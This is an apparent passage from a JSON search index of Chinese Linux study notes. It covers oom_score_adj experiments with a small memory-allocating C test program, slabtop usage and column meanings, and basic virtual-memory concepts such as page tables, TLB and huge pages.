\u5982\u679c\u8bbe\u7f6e\u4e3a\u8d1f\u6570\uff0c\u8868\u793a\u5206\u6570\u4f1a\u6253\u4e00\u5b9a\u7684\u6298\u6263\u3002 \u5982\u679c\u8bbe\u7f6e\u4e3a\u6b63\u6570\uff0c\u5206\u6570\u4f1a\u589e\u52a0\uff0c\u53ef\u4ee5\u4f18\u5148\u6740\u6b7b\u8be5\u8fdb\u7a0b\u3002 \u5982\u679c\u8bbe\u7f6e\u4e3a0 \uff0c\u8868\u793a\u7528\u6237\u4e0d\u8c03\u6574\u5206\u6570\uff0c0 \u662f\u9ed8\u8ba4\u503c\u3002","title":"oom_score_adj"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E8%AF%84%E5%88%86%E6%98%AF%E5%A6%82%E4%BD%95%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84/#oom_score_adj-oom_score","text":"#include <stdlib.h> #include <stdio.h> #define BYTES (8 * 1024 * 1024) #define N (10240) int main(void) { printf(\"hello OOM \\n\"); int i; for (i = 0; i < N; i++) { char *p = malloc(BYTES); if (p == NULL) { return -1; } } printf(\"while... \\n\"); while(1); return 0; } \u4e0b\u9762\u662f\u521d\u59cb\u7684\u5206\u6570\uff1a $ cat /proc/$(pidof a.out)/oom_score_adj 0 $ cat /proc/$(pidof a.out)/oom_score 62 \u4e0b\u9762\u4fee\u6539 oom_score_adj\uff0coom_score \u4e5f\u968f\u4e4b\u53d1\u751f\u4e86\u53d8\u5316\uff1a $ sudo sh -c \"echo -50 > /proc/$(pidof a.out)/oom_score_adj\" $ cat /proc/$(pidof a.out)/oom_score_adj -50 $ cat /proc/$(pidof a.out)/oom_score 12 $ sudo sh -c \"echo -60 > /proc/$(pidof a.out)/oom_score_adj\" $ cat /proc/$(pidof a.out)/oom_score_adj -60 $ cat /proc/$(pidof a.out)/oom_score 2 $ sudo sh -c \"echo -500 > /proc/$(pidof a.out)/oom_score_adj\" $ cat /proc/$(pidof a.out)/oom_score_adj -500 $ cat /proc/$(pidof a.out)/oom_score 0","title":"\u6d4b\u8bd5\u8bbe\u7f6e oom_score_adj \u5bf9 oom_score \u7684\u5f71\u54cd"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E8%AF%84%E5%88%86%E6%98%AF%E5%A6%82%E4%BD%95%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84/#oom_score_adj-1000","text":"\u5982\u679c\u628a\u4e00\u4e2a\u65e0\u9650\u7533\u8bf7\u5185\u5b58\u7684\u8fdb\u7a0b\u8bbe\u7f6e\u4e3a-1000\uff0c\u4f1a\u53d1\u751f\u4ec0\u4e48\u5462\uff1a $ sudo sh -c \"echo -1000 > /proc/$(pidof a.out)/oom_score_adj\" $ dmesg | grep \"Out of memory\" Out of memory: Kill process 1000 (mysqld) score 67 or sacrifice child Out of memory: Kill process 891 (vmhgfs-fuse) score 1 or sacrifice child Out of memory: Kill process 321 (systemd-journal) score 1 or sacrifice child Out of memory: Kill process 1052 ((sd-pam)) score 1 or sacrifice child Out of memory: Kill process 1072 (bash) score 0 or sacrifice child \u56e0\u4e3a bash \u6302\u4e86\uff0c\u6240\u4ee5 a.out \u4e5f\u6302\u4e86\u3002 \u5982\u679c ./a.out & \u5728\u540e\u53f0\u8fd0\u884c\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u7528\u66f4\u591a\u8fdb\u7a0b\u7684 score \u662f 0 \u4ecd\u7136\u6302\u6389\u4e86\uff0c\u6bd4\u5982 sshd\u3001dhclient\u3001systemd-logind\u3001systemd-timesyn\u3001dbus-daemon \u7b49\uff0c\u6240\u4ee5\u8bbe\u7f6e\u9519\u8bef\u7684 oom_score_adj \u540e\u679c\u6bd4\u8f83\u4e25\u91cd\u3002 https://www.jianshu.com/p/bbaeff371019 https://blog.csdn.net/u010278923/article/details/105688107","title":"\u6d4b\u8bd5\u8bbe\u7f6e oom_score_adj \u8bbe\u7f6e\u4e3a-1000 \u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd"},{"location":"system/linux/%E5%86%85%E5%AD%98/slabtop/","text":"slabtop\u547d\u4ee4 \u8bed\u6cd5\u683c\u5f0f \uff1aslabtop [\u53c2\u6570] $ slabtop -h \u7528\u6cd5: slabtop [\u9009\u9879] \u9009\u9879: -d, --delay <secs> \u66f4\u6539\u5237\u65b0\u65f6\u95f4 -o, --once \u53ea\u663e\u793a\u4e00\u6b21\u5c31\u9000\u51fa -s, --sort <char> \u6309\u7167\u4ec0\u4e48\u6392\u5e8f\uff0c\u4f7f\u7528\u6392\u5e8f\u9009\u9879 -h, --help \u663e\u793a\u5e2e\u52a9 -V, --version \u663e\u793a\u7248\u672c \u6392\u5e8f\u9009\u9879: a : \u6309\u7167ACTIVE\u8fdb\u884c\u6392\u5e8f b : \u6309\u7167OBJ/SLAB\u8fdb\u884c\u6392\u5e8f c : \u6309\u7167CACHE SIZE\u8fdb\u884c\u6392\u5e8f l : \u6309\u7167SLABS\u8fdb\u884c\u6392\u5e8f n : \u6309\u7167NAME\u8fdb\u884c\u6392\u5e8f o : \u6309\u7167OBJS\u8fdb\u884c\u6392\u5e8f\uff08\u9ed8\u8ba4\u6309\u6b64\u987a\u5e8f\u6392\u5e8f\uff09 s : \u6309\u7167OBJ SIZE\u8fdb\u884c\u6392\u5e8f u : \u6309\u7167USE\u8fdb\u884c\u6392\u5e8f $slabtop -o Active / Total Objects (% used) : 110848 / 132470 (83.7%) Active / Total Slabs (% used) : 3844 / 3844 (100.0%) Active / Total Caches (% used) : 74 / 105 (70.5%) Active / Total Size (% used) : 25728.59K / 29652.53K (86.8%) Minimum / Average / Maximum Object : 0.01K / 0.22K / 8.00K OBJS ACTIVE USE OBJ SIZE SLABS OBJ/SLAB CACHE SIZE NAME 18837 6569 34% 0.10K 483 39 1932K buffer_head 17952 17884 99% 0.12K 528 34 2112K kernfs_node_cache 14826 12898 86% 0.19K 706 21 2824K dentry 10506 9465 90% 0.04K 103 102 412K selinux_inode_security \u5404\u5217\u89e3\u91ca\u542b\u4e49 OBJS \u2014 The total number of objects (memory blocks), including those in use (allocated), and some spares not in use. \u5bf9\u8c61\u7684\u603b\u6570 ACTIVE \u2014 The number of objects (memory blocks) that are in use (allocated). \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u6570\u3002 USE \u2014 Percentage of total objects that are active. \u6d3b\u52a8\u5bf9\u8c61\u603b\u6570\u7684\u767e\u5206\u6bd4 \u3002((ACTIVE/OBJS)(100)) OBJ SIZE \u2014 The size of the objects. \u5bf9\u8c61\u7684\u5927\u5c0f\u3002\uff08\u5bf9\u5e94/proc/slabinfo\u4e2d <objsize> \uff09 SLABS \u2014 The total number of slabs. slabs\u7684\u4e2a\u6570\u3002\uff08slab\u7684\u4e2a\u6570\uff0c\u5bf9\u5e94/proc/slabinfo\u4e2d\u7684nums_slabs\uff09 OBJ/SLAB \u2014 The number of objects that fit into a slab. slab\u4e2d\u7684\u5bf9\u8c61\u6570\u3002\uff08\u4e00\u4e2aslab\u4e2d\u591a\u5c11\u4e2a\u5bf9\u8c61\uff09 CACHE SIZE \u2014 The cache size of the slab. \u5bf9\u8c61\u7f13\u5b58\u5927\u5c0f(\u6211\u53d1\u73b0\u8fd9\u4e2a\u503c\u5927\u5c0f\u6b63\u597d\u7b49\u4e8eOBJS\u4e58\u4ee5OBJ SIZE\uff0c\u5728/proc/slabinfo\u4e2d\uff0c <num_objs> \u4e58\u4ee5 <objsize> ) NAME \u2014 The name of the slab. slab\u7684\u540d\u79f0 slabtop\u4ea4\u4e92\u547d\u4ee4 \u6309 a \u6309\u7167ACTIVE\u8fdb\u884c\u6392\u5e8f b \u6309\u7167OBJ/SLAB\u8fdb\u884c\u6392\u5e8f c \u6309\u7167CACHE SIZE\u8fdb\u884c\u6392\u5e8f l \u6309\u7167SLABS\u8fdb\u884c\u6392\u5e8f n \u6309\u7167NAME\u8fdb\u884c\u6392\u5e8f o \u6309\u7167OBJS\u8fdb\u884c\u6392\u5e8f s \u6309\u7167OBJ SIZE\u8fdb\u884c\u6392\u5e8f u \u6309\u7167USE\u8fdb\u884c\u6392\u5e8f \u6750\u6599\uff1a https://docs.fedoraproject.org/en-US/Fedora/15/html/Deployment_Guide/s2-proc-slabinfo.html https://man7.org/linux/man-pages/man1/slabtop.1.html","title":"slabtop\u547d\u4ee4"},{"location":"system/linux/%E5%86%85%E5%AD%98/slabtop/#slabtop","text":"\u8bed\u6cd5\u683c\u5f0f \uff1aslabtop [\u53c2\u6570] $ slabtop -h \u7528\u6cd5: slabtop [\u9009\u9879] \u9009\u9879: -d, --delay <secs> \u66f4\u6539\u5237\u65b0\u65f6\u95f4 -o, --once \u53ea\u663e\u793a\u4e00\u6b21\u5c31\u9000\u51fa -s, --sort <char> \u6309\u7167\u4ec0\u4e48\u6392\u5e8f\uff0c\u4f7f\u7528\u6392\u5e8f\u9009\u9879 -h, --help \u663e\u793a\u5e2e\u52a9 -V, --version \u663e\u793a\u7248\u672c \u6392\u5e8f\u9009\u9879: a : \u6309\u7167ACTIVE\u8fdb\u884c\u6392\u5e8f b : \u6309\u7167OBJ/SLAB\u8fdb\u884c\u6392\u5e8f c : \u6309\u7167CACHE SIZE\u8fdb\u884c\u6392\u5e8f l : \u6309\u7167SLABS\u8fdb\u884c\u6392\u5e8f n : \u6309\u7167NAME\u8fdb\u884c\u6392\u5e8f o : \u6309\u7167OBJS\u8fdb\u884c\u6392\u5e8f\uff08\u9ed8\u8ba4\u6309\u6b64\u987a\u5e8f\u6392\u5e8f\uff09 s : \u6309\u7167OBJ SIZE\u8fdb\u884c\u6392\u5e8f u : \u6309\u7167USE\u8fdb\u884c\u6392\u5e8f $slabtop -o Active / Total Objects (% used) : 110848 / 132470 (83.7%) Active / Total Slabs (% used) : 3844 / 3844 (100.0%) Active / Total Caches (% used) : 74 / 105 (70.5%) Active / Total Size (% used) : 25728.59K / 29652.53K (86.8%) Minimum / Average / Maximum Object : 0.01K / 0.22K / 8.00K OBJS ACTIVE USE OBJ SIZE SLABS OBJ/SLAB CACHE SIZE NAME 18837 6569 34% 0.10K 483 39 1932K buffer_head 17952 17884 99% 0.12K 528 34 2112K kernfs_node_cache 14826 12898 86% 0.19K 706 21 2824K dentry 10506 9465 90% 0.04K 103 102 412K selinux_inode_security","title":"slabtop\u547d\u4ee4"},{"location":"system/linux/%E5%86%85%E5%AD%98/slabtop/#_1","text":"OBJS \u2014 The total number of objects (memory blocks), including those in use (allocated), and some spares not in use. \u5bf9\u8c61\u7684\u603b\u6570 ACTIVE \u2014 The number of objects (memory blocks) that are in use (allocated). \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u6570\u3002 USE \u2014 Percentage of total objects that are active. \u6d3b\u52a8\u5bf9\u8c61\u603b\u6570\u7684\u767e\u5206\u6bd4 \u3002((ACTIVE/OBJS)(100)) OBJ SIZE \u2014 The size of the objects. \u5bf9\u8c61\u7684\u5927\u5c0f\u3002\uff08\u5bf9\u5e94/proc/slabinfo\u4e2d <objsize> \uff09 SLABS \u2014 The total number of slabs. slabs\u7684\u4e2a\u6570\u3002\uff08slab\u7684\u4e2a\u6570\uff0c\u5bf9\u5e94/proc/slabinfo\u4e2d\u7684nums_slabs\uff09 OBJ/SLAB \u2014 The number of objects that fit into a slab. slab\u4e2d\u7684\u5bf9\u8c61\u6570\u3002\uff08\u4e00\u4e2aslab\u4e2d\u591a\u5c11\u4e2a\u5bf9\u8c61\uff09 CACHE SIZE \u2014 The cache size of the slab. \u5bf9\u8c61\u7f13\u5b58\u5927\u5c0f(\u6211\u53d1\u73b0\u8fd9\u4e2a\u503c\u5927\u5c0f\u6b63\u597d\u7b49\u4e8eOBJS\u4e58\u4ee5OBJ SIZE\uff0c\u5728/proc/slabinfo\u4e2d\uff0c <num_objs> \u4e58\u4ee5 <objsize> ) NAME \u2014 The name of the slab. slab\u7684\u540d\u79f0","title":"\u5404\u5217\u89e3\u91ca\u542b\u4e49"},{"location":"system/linux/%E5%86%85%E5%AD%98/slabtop/#slabtop_1","text":"\u6309 a \u6309\u7167ACTIVE\u8fdb\u884c\u6392\u5e8f b \u6309\u7167OBJ/SLAB\u8fdb\u884c\u6392\u5e8f c \u6309\u7167CACHE SIZE\u8fdb\u884c\u6392\u5e8f l \u6309\u7167SLABS\u8fdb\u884c\u6392\u5e8f n \u6309\u7167NAME\u8fdb\u884c\u6392\u5e8f o \u6309\u7167OBJS\u8fdb\u884c\u6392\u5e8f s \u6309\u7167OBJ SIZE\u8fdb\u884c\u6392\u5e8f u \u6309\u7167USE\u8fdb\u884c\u6392\u5e8f \u6750\u6599\uff1a https://docs.fedoraproject.org/en-US/Fedora/15/html/Deployment_Guide/s2-proc-slabinfo.html https://man7.org/linux/man-pages/man1/slabtop.1.html","title":"slabtop\u4ea4\u4e92\u547d\u4ee4"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E5%86%85%E5%AD%98/","text":"\u5185\u5b58 32\u4f4d\u7cfb\u7edf\uff0c\u4e00\u822c\u6307CPU\u7684\u5730\u5740\u603b\u7ebf\u4e3a32\u4f4d\uff0c2\u768432\u6b21\u65b9\u4e3a4294967296\uff0c4294967296\u4e2a\u5185\u5b58\u5355\u4f4d\uff0c\u6bcf\u4e2a\u5185\u5b58\u5355\u4f4d\u4e3a\u4e00\u4e2abyte\uff0c4294967296byte\u4e3a4G\u3002 64\u4f4d\u7cfb\u7edf\uff0c2\u768464\u6b21\u65b9\u4e3a18446744073709552000\uff0c18446744073709552000byte\u4e3a16EB\u3002\u4f46\u662f\u901a\u5e3864\u4f4d\u7cfb\u7edf\u7684\u7269\u7406\u5bfb\u5740\u7a7a\u95f4\u4e0d\u4f1a\u8bbe\u5b9a\u8fd9\u4e48\u5927\uff0c\u5728redhat7\u4e2d\uff0c\u5177\u6709 48/46 \u4f4d\u865a\u62df/\u7269\u7406\u5185\u5b58\u5bfb\u5740\u5bb9\u91cf\uff0c\u7269\u7406\u603b\u7ebf\u5bfb\u5740\u7ebf\u5c06\u7269\u7406\u5185\u5b58\u4e0a\u9650\u5bb9\u91cf\u8bbe\u7f6e\u4e3a 64 TB\u3002redhat8\u6269\u5c55\u5230 57/52 \u4f4d\u865a\u62df/\u7269\u7406\u5185\u5b58\u5bfb\u5740\uff0c\u5177\u6709 128 PiB \u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u548c 4 PB \u7684\u7269\u7406\u5185\u5b58\u5bb9\u91cf\u3002 redhat\u5b98\u65b9\u4ecb\u7ecd\uff1a \u7b2c 5 \u7ae0\u3002RHEL 8.0.0 \u7248\u672c Red Hat Enterprise Linux 8 |\u7ea2\u5e3d\u5ba2\u6237\u95e8\u6237 \u7269\u7406\u5185\u5b58\uff1a\u4e3b\u5b58\uff0c\u901a\u5e38\u662f\u52a8\u6001\u968f\u673a\u8bbf\u95ee\u5185\u5b58DRAM\uff0cFree\u547d\u4ee4\u4e2d\u7684Total\u5b57\u6bb5 \u865a\u62df\u5185\u5b58\uff1a\u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u63d0\u4f9b\u4e86\u72ec\u7acb\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0cTop\u547d\u4ee4\u4e2d\u7684Virt\u5b57\u6bb5 \u5185\u5b58\u6620\u5c04\uff1a\u5c06\u865a\u62df\u5185\u5b58\u5730\u5740\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\u5730\u5740\uff0c\u6620\u5c04\u5173\u7cfb\u7531\u5185\u6838\u4fdd\u5b58\u5728\u9875\u8868\u5f53\u4e2d\u3002\u5176\u5b9e\u5c31\u662f\u5c06\u865a\u62df\u5185\u5b58\u5730\u5740\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\u5730\u5740\u3002\u4e3a\u4e86\u5b8c\u6210\u5185\u5b58\u6620\u5c04\uff0c\u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u7ef4\u62a4\u4e86\u4e00\u5f20\u9875\u8868\uff0c\u8bb0\u5f55\u865a\u62df\u5730\u5740\u4e0e\u7269\u7406\u5730\u5740\u7684\u6620\u5c04\u5173\u7cfb\u3002 \u9875\u8868\u5b9e\u9645\u4e0a\u5b58\u50a8\u5728 CPU \u7684\u5185\u5b58\u7ba1\u7406\u5355\u5143 MMU \u4e2d \uff0c\u8fd9\u6837\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5904\u7406\u5668\u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u786c\u4ef6\uff0c\u627e\u51fa\u8981\u8bbf\u95ee\u7684\u5185\u5b58\u3002 TLB\uff1a\u8f6c\u8bd1\u540e\u5907\u7f13\u51b2\u5668\uff0cCPU\u786c\u4ef6\u7f13\u5b58\uff0c\u7f13\u5b58\u9875\u8868\u4e2d\u7684\u6620\u5c04\u5173\u7cfb MMU\uff1a\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff0c\u8d1f\u8d23\u5185\u5b58\u6620\u5c04 TLB \u5176\u5b9e\u5c31\u662f MMU \u4e2d\u9875\u8868\u7684\u9ad8\u901f\u7f13\u5b58\u3002\u7531\u4e8e\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u662f\u72ec\u7acb\u7684\uff0c\u800c TLB \u7684\u8bbf\u95ee\u901f\u5ea6\u53c8\u6bd4 MMU \u5feb\u5f97\u591a\uff0c\u6240\u4ee5\uff0c\u901a\u8fc7\u51cf\u5c11\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u51cf\u5c11 TLB \u7684\u5237\u65b0\u6b21\u6570\uff0c\u5c31\u53ef\u4ee5\u63d0\u9ad8 TLB \u7f13\u5b58\u7684\u4f7f\u7528\u7387\uff0c\u8fdb\u800c\u63d0\u9ad8 CPU \u7684\u5185\u5b58\u8bbf\u95ee\u6027\u80fd\u3002 \u4e0d\u8fc7\u8981\u6ce8\u610f\uff0cMMU \u5e76\u4e0d\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u6765\u7ba1\u7406\u5185\u5b58\uff0c\u800c\u662f\u89c4\u5b9a\u4e86\u4e00\u4e2a\u5185\u5b58\u6620\u5c04\u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u4e5f\u5c31\u662f\u9875\uff0c\u901a\u5e38\u662f 4 KB \u5927\u5c0f\u3002\u8fd9\u6837\uff0c\u6bcf\u4e00\u6b21\u5185\u5b58\u6620\u5c04\uff0c\u90fd\u9700\u8981\u5173\u8054 4 KB \u6216\u8005 4KB \u6574\u6570\u500d\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u9875\u7684\u5927\u5c0f\u53ea\u6709 4 KB \uff0c\u5bfc\u81f4\u7684\u53e6\u4e00\u4e2a\u95ee\u9898\u5c31\u662f\uff0c\u6574\u4e2a\u9875\u8868\u4f1a\u53d8\u5f97\u975e\u5e38\u5927\u3002\u6bd4\u65b9\u8bf4\uff0c\u4ec5 32 \u4f4d\u7cfb\u7edf\u5c31\u9700\u8981 100 \u591a\u4e07\u4e2a\u9875\u8868\u9879\uff084GB/4KB\uff09\uff0c\u624d\u53ef\u4ee5\u5b9e\u73b0\u6574\u4e2a\u5730\u5740\u7a7a\u95f4\u7684\u6620\u5c04\u3002 \u4e3a\u4e86\u89e3\u51b3\u9875\u8868\u9879\u8fc7\u591a\u7684\u95ee\u9898\uff0cLinux \u63d0\u4f9b\u4e86\u4e24\u79cd\u673a\u5236\uff0c\u4e5f\u5c31\u662f\u591a\u7ea7\u9875\u8868\u548c\u5927\u9875\uff08HugePage\uff09\u3002\u591a\u7ea7\u9875\u8868\u5c31\u662f\u628a\u5185\u5b58\u5206\u6210\u533a\u5757\u6765\u7ba1\u7406\uff0c\u5c06\u539f\u6765\u7684\u6620\u5c04\u5173\u7cfb\u6539\u6210\u533a\u5757\u7d22\u5f15\u548c\u533a\u5757\u5185\u7684\u504f\u79fb\u3002\u7531\u4e8e\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u901a\u5e38\u53ea\u7528\u4e86\u5f88\u5c11\u4e00\u90e8\u5206\uff0c\u90a3\u4e48\uff0c\u591a\u7ea7\u9875\u8868\u5c31\u53ea\u4fdd\u5b58\u8fd9\u4e9b\u4f7f\u7528\u4e2d\u7684\u533a\u5757\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5927\u5927\u5730\u51cf\u5c11\u9875\u8868\u7684\u9879\u6570\u3002 Linux \u7528\u7684\u6b63\u662f\u56db\u7ea7\u9875\u8868\u6765\u7ba1\u7406\u5185\u5b58\u9875\uff08\u8fd9\u91cc\u4e0d\u592a\u51c6\u786e\uff0c\u4e0d\u540c\u7684\u53d1\u884c\u7248\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u5728redhat8.0\u5c31\u7528\u4e865\u7ea7\uff0c Chapter 5. RHEL 8.0.0 release Red Hat Enterprise Linux 8 | Red Hat Customer Portal \uff09\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u865a\u62df\u5730\u5740\u88ab\u5206\u4e3a 5 \u4e2a\u90e8\u5206\uff0c\u524d 4 \u4e2a\u8868\u9879\u7528\u4e8e\u9009\u62e9\u9875\uff0c\u800c\u6700\u540e\u4e00\u4e2a\u7d22\u5f15\u8868\u793a\u9875\u5185\u504f\u79fb\u3002 \u518d\u770b\u5927\u9875\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u6bd4\u666e\u901a\u9875\u66f4\u5927\u7684\u5185\u5b58\u5757\uff0c\u5e38\u89c1\u7684\u5927\u5c0f\u6709 2MB \u548c 1GB\u3002\u5927\u9875\u901a\u5e38\u7528\u5728\u4f7f\u7528\u5927\u91cf\u5185\u5b58\u7684\u8fdb\u7a0b\u4e0a\uff0c\u6bd4\u5982 Oracle\u3001DPDK \u7b49\u3002\u901a\u8fc7\u8fd9\u4e9b\u673a\u5236\uff0c\u5728\u9875\u8868\u7684\u6620\u5c04\u4e0b\uff0c\u8fdb\u7a0b\u5c31\u53ef\u4ee5\u901a\u8fc7\u865a\u62df\u5730\u5740\u6765\u8bbf\u95ee\u7269\u7406\u5185\u5b58\u4e86","title":"\u5185\u5b58"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E5%86%85%E5%AD%98/#_1","text":"32\u4f4d\u7cfb\u7edf\uff0c\u4e00\u822c\u6307CPU\u7684\u5730\u5740\u603b\u7ebf\u4e3a32\u4f4d\uff0c2\u768432\u6b21\u65b9\u4e3a4294967296\uff0c4294967296\u4e2a\u5185\u5b58\u5355\u4f4d\uff0c\u6bcf\u4e2a\u5185\u5b58\u5355\u4f4d\u4e3a\u4e00\u4e2abyte\uff0c4294967296byte\u4e3a4G\u3002 64\u4f4d\u7cfb\u7edf\uff0c2\u768464\u6b21\u65b9\u4e3a18446744073709552000\uff0c18446744073709552000byte\u4e3a16EB\u3002\u4f46\u662f\u901a\u5e3864\u4f4d\u7cfb\u7edf\u7684\u7269\u7406\u5bfb\u5740\u7a7a\u95f4\u4e0d\u4f1a\u8bbe\u5b9a\u8fd9\u4e48\u5927\uff0c\u5728redhat7\u4e2d\uff0c\u5177\u6709 48/46 \u4f4d\u865a\u62df/\u7269\u7406\u5185\u5b58\u5bfb\u5740\u5bb9\u91cf\uff0c\u7269\u7406\u603b\u7ebf\u5bfb\u5740\u7ebf\u5c06\u7269\u7406\u5185\u5b58\u4e0a\u9650\u5bb9\u91cf\u8bbe\u7f6e\u4e3a 64 TB\u3002redhat8\u6269\u5c55\u5230 57/52 \u4f4d\u865a\u62df/\u7269\u7406\u5185\u5b58\u5bfb\u5740\uff0c\u5177\u6709 128 PiB \u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u548c 4 PB \u7684\u7269\u7406\u5185\u5b58\u5bb9\u91cf\u3002 redhat\u5b98\u65b9\u4ecb\u7ecd\uff1a \u7b2c 5 \u7ae0\u3002RHEL 8.0.0 \u7248\u672c Red Hat Enterprise Linux 8 |\u7ea2\u5e3d\u5ba2\u6237\u95e8\u6237 \u7269\u7406\u5185\u5b58\uff1a\u4e3b\u5b58\uff0c\u901a\u5e38\u662f\u52a8\u6001\u968f\u673a\u8bbf\u95ee\u5185\u5b58DRAM\uff0cFree\u547d\u4ee4\u4e2d\u7684Total\u5b57\u6bb5 \u865a\u62df\u5185\u5b58\uff1a\u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u63d0\u4f9b\u4e86\u72ec\u7acb\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0cTop\u547d\u4ee4\u4e2d\u7684Virt\u5b57\u6bb5 \u5185\u5b58\u6620\u5c04\uff1a\u5c06\u865a\u62df\u5185\u5b58\u5730\u5740\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\u5730\u5740\uff0c\u6620\u5c04\u5173\u7cfb\u7531\u5185\u6838\u4fdd\u5b58\u5728\u9875\u8868\u5f53\u4e2d\u3002\u5176\u5b9e\u5c31\u662f\u5c06\u865a\u62df\u5185\u5b58\u5730\u5740\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\u5730\u5740\u3002\u4e3a\u4e86\u5b8c\u6210\u5185\u5b58\u6620\u5c04\uff0c\u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u7ef4\u62a4\u4e86\u4e00\u5f20\u9875\u8868\uff0c\u8bb0\u5f55\u865a\u62df\u5730\u5740\u4e0e\u7269\u7406\u5730\u5740\u7684\u6620\u5c04\u5173\u7cfb\u3002 \u9875\u8868\u5b9e\u9645\u4e0a\u5b58\u50a8\u5728 CPU \u7684\u5185\u5b58\u7ba1\u7406\u5355\u5143 MMU \u4e2d \uff0c\u8fd9\u6837\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5904\u7406\u5668\u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u786c\u4ef6\uff0c\u627e\u51fa\u8981\u8bbf\u95ee\u7684\u5185\u5b58\u3002 TLB\uff1a\u8f6c\u8bd1\u540e\u5907\u7f13\u51b2\u5668\uff0cCPU\u786c\u4ef6\u7f13\u5b58\uff0c\u7f13\u5b58\u9875\u8868\u4e2d\u7684\u6620\u5c04\u5173\u7cfb MMU\uff1a\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff0c\u8d1f\u8d23\u5185\u5b58\u6620\u5c04 TLB \u5176\u5b9e\u5c31\u662f MMU \u4e2d\u9875\u8868\u7684\u9ad8\u901f\u7f13\u5b58\u3002\u7531\u4e8e\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u662f\u72ec\u7acb\u7684\uff0c\u800c TLB \u7684\u8bbf\u95ee\u901f\u5ea6\u53c8\u6bd4 MMU \u5feb\u5f97\u591a\uff0c\u6240\u4ee5\uff0c\u901a\u8fc7\u51cf\u5c11\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u51cf\u5c11 TLB \u7684\u5237\u65b0\u6b21\u6570\uff0c\u5c31\u53ef\u4ee5\u63d0\u9ad8 TLB \u7f13\u5b58\u7684\u4f7f\u7528\u7387\uff0c\u8fdb\u800c\u63d0\u9ad8 CPU \u7684\u5185\u5b58\u8bbf\u95ee\u6027\u80fd\u3002 \u4e0d\u8fc7\u8981\u6ce8\u610f\uff0cMMU \u5e76\u4e0d\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u6765\u7ba1\u7406\u5185\u5b58\uff0c\u800c\u662f\u89c4\u5b9a\u4e86\u4e00\u4e2a\u5185\u5b58\u6620\u5c04\u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u4e5f\u5c31\u662f\u9875\uff0c\u901a\u5e38\u662f 4 KB \u5927\u5c0f\u3002\u8fd9\u6837\uff0c\u6bcf\u4e00\u6b21\u5185\u5b58\u6620\u5c04\uff0c\u90fd\u9700\u8981\u5173\u8054 4 KB \u6216\u8005 4KB \u6574\u6570\u500d\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u9875\u7684\u5927\u5c0f\u53ea\u6709 4 KB \uff0c\u5bfc\u81f4\u7684\u53e6\u4e00\u4e2a\u95ee\u9898\u5c31\u662f\uff0c\u6574\u4e2a\u9875\u8868\u4f1a\u53d8\u5f97\u975e\u5e38\u5927\u3002\u6bd4\u65b9\u8bf4\uff0c\u4ec5 32 \u4f4d\u7cfb\u7edf\u5c31\u9700\u8981 100 \u591a\u4e07\u4e2a\u9875\u8868\u9879\uff084GB/4KB\uff09\uff0c\u624d\u53ef\u4ee5\u5b9e\u73b0\u6574\u4e2a\u5730\u5740\u7a7a\u95f4\u7684\u6620\u5c04\u3002 \u4e3a\u4e86\u89e3\u51b3\u9875\u8868\u9879\u8fc7\u591a\u7684\u95ee\u9898\uff0cLinux 